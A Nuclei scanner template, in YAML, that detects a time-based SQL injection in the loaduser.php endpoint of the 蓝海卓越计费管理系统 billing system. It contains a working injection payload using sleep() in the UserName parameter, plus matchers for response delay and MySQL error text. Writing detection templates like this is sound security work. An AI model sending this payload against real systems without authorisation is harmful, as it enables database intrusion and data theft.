id: lhzy-billing-management-system-sqli
info:
  name: 蓝海卓越计费管理系统 loaduser.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) * 2}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        GET /ajax/loaduser.php?UserName=1'+AND+(SELECT+2*(IF((SELECT+*+FROM+(SELECT+CONCAT(0x716a7a6a71,(SELECT+(ELT(3776=3776,1))),sleep({{t1}}),0x78))s),+8446744073709551610,+8446744073709551610)))--+opzJ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "MySQL Query Error"
          - "DataBase Error"
        part: body
      - type: dsl
        dsl:
          - "duration > t2 && duration < t3"
      - type: status
        status:
          - 200
